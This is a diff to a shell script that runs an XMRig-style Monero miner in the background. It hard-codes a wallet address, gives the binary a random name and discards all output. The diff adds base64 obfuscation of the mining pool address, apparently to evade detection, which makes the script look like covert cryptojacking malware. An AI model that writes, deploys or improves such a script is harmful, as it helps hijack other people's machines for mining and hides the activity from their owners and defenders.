@@ -2,7 +2,8 @@
 
 ### BASIC CONFIG ###
 WALLET="89PKYocdkhoeSCsn93wAVY7yqCAsSpgZkFriDyhFoW4DMZtzKRbeTZT4cgfedxvju98rXe6mT62eEZigpvV9VtAm5uSkZkQ"
-POOL="pool.supportxmr.com:443"
+# Obfuscated pool (Base64 of pool.supportxmr.com:443)
+POOL=$(echo 'cG9vbC5zdXBwb3J0eG1yLmNvbTo0NDM=' | base64 -d)
 THREADS=12
 RAND_NAME=$(head /dev/urandom | tr -dc a-z0-9 | head -c 8)
 WORKER_ID="worker-$(hostname | tr -dc a-z0-9)"
@@ -36,7 +37,7 @@ if [ ! -f "./$RAND_NAME" ]; then
     setup_miner
 fi
 
-### RUN THE MINER IN BACKGROUND WITH ALIAS ###
+### RUN THE MINER IN BACKGROUND ###
 echo "[*] Launching mining process..."
 nohup ./$RAND_NAME -o $POOL -u $WALLET -k -p $WORKER_ID --tls --donate-level 1 -t $THREADS >/dev/null 2>&1 &
 
